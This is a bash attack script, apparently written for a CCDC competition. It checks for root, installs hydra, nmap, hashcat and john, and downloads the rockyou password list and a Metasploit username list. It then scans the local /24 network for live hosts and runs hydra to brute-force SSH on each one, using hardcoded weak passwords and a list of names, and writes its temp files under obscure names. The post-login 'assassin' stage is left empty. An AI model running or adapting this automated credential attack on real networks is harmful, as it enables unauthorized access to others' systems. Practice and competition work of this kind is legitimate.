#!/bin/bash
#=======================================================================================
#=== DESCIPTION ========================================================================
#=======================================================================================
	## gathers passwords
	## cleans up output file
	## logs into ssh session and does it's business
########################################################################################
########################################################################################
	#
	#*************** NEED TO DO/ADD ***********************
	# check and create all dir/files
	# check/install/configure needed apps
	# include a ccdc generated username list
	# don't assume /24 CIDR, and find the right one
	# check multiple interfaces and multiple IP ranges
	# change IP if getting blocked ( but only try a few times, and test for connectivity to avoid infinite loop)
	#******************************************************
	#
#///////////////////////////////////////////////////////////////////////////////////////
#|||||||||||||||||||||||| Script Stuff Starts |||||||||||||||||||||||||||||||||||||||||
#\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#######################
function main(){	###
	neo				###
	meat			###
	bones			###
	brute			###
	assassin		###
}					###
#######################
#### Variables ####
pwListFull="/usr/share/wordlists/rockyou.txt"
userListUnix="/usr/share/wordlists/metasploit/unix_users.txt"
listsDir="/usr/share/wordlists"
###########################################################################################
#are you root? no? well, try again
###########################################################################################
function neo(){
	if [[ $EUID -ne 0  ]]; then
		printf "\nyou forgot to run as root again... "
		printf "\nCurrent dir is "$(pwd)"\n\n"
		exit 1
	fi
	}
###########################################################################################
# checking for files and dirs
###########################################################################################
function bones(){
	#checking for wordlist dir
	if [[ ! -d $listsDir ]]; then
		printf "\nCouldn't find wordlist dir. Creating \n\t[$listsDir]\n"
		command mkdir -p $listsDir/metasploit
	fi

	#checking for 'rockyou.txt' password list
	if [[ ! -f $pwListFull ]]; then
		printf "\n"
		#checking for the .gz
		if [[ -f $pwListFull.gz ]]; then
			printf "\nExtracting rockyou.txt\n"
			command tar -xf $pwListFull.gz -C $listsDir
		else
			#downloading rockyou.txt
			printf "\nCouldn't find rockyou.txt or rockyou.txt.gz\nDownloading it to:\n\t[$pwListFull]\n\n\n"
			command curl -L -o $pwListFull https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
		fi
	fi

	#checking for 'unix_users.txt'
	if [[ ! -f $userListUnix ]]; then
		#downloading unix_users list
		printf "\n\n\nCouldn't find unix_users file\nDownloading it to:\n\t[$userListUnix]\n\n\n"
		command curl -L -o $userListUnix https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/unix_users.txt
		printf "\n\n\n"
	fi
}
###########################################################################################
# check/install/configure apps
###########################################################################################
function meat(){
	# wanted app lists
	command="hydra hashcat john nmap curl net-tools"
	installing=""

		# checking if apps are installed
		for word in $command; do
			if ! dpkg-query -W -f='${Status}' $word | grep -q "ok installed"; then
				installing="${installing} $word"
				echo "$word"
			fi
		done

		# installing missing apps
		if [ ! -z "$installing" ]; then
			command yes | apt install $installing
			printf "\n\n\tInstalled:\n\t\t[$installing ]\n\n"
		else
			printf "\n--------------------------------------------------------------------\n"
		fi

		# where important lists are stored
		printf "\n\tUsername List:\n"
		printf "\n\t\t[$userListUnix]\n\n"
		printf "\n\tPassword List:\n"
		printf "\n\t\t[$pwListFull]\n\n"

}
###########################################################################################
# banging down the door
###########################################################################################
function brute(){
	# gathering local network ID info (hopefully)
		netID="$(route -n | tail -n +3 | cut -d" " -f1 | grep -P "[^^0\.].+\.0")"
	# gathering live HOSTS
		liveHosts="/tmp/zlxoiqa"
		printf "\nGenerating list of pingable hosts on the network, might take short while (~2 min)\n"
		printf "$(nmap -sn $netID/24 -oG - | awk '/Up$/{print $2}')\n" > $liveHosts
		command sed -i "/$(hostname -I | tr -d " ")/d" $liveHosts
	# basic list of PASSWORDS
		pwListBasic="/tmp/flfidoo"
		printf "P@ssw0rd\npassword\nPASSWORD\npassw0rd\np@ssword\nP@ssword\nqwerty\nQWERTY\nqwert\nQWERT\nwasd\nWASD\nqwe\nQWE\nCCDC\nccdc\n" > $pwListBasic
		#pwListFull
	# basic list of USERNAMES
		userListBasic="/tmp/dosielsxi"
		printf "adam\nalex\nalexander\nandrew\nangel\nanreah\narmagetronad\nbrad\ncanyon\ncasey\ncharles\nchris\nclay\ndale\ndavid\ndoug\nevan\ngeoffrey\nhilary\nkip\nleah\nnolan\nsamuel\nshane\nsmith\ntori\ntyler\nyianni\n" > $userListBasic
		#userListUnix

	### testing all login info for all IPs
		#if hydra.restore ask if skip
		if [ -f hydra.restore ]; then
:
		fi
		hydra -L $userListBasic -P $pwListBasic -M $liveHosts ssh

}
###########################################################################################
# ssh's in and does it's business
###########################################################################################
function assassin(){
	#
	:
	}
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

main
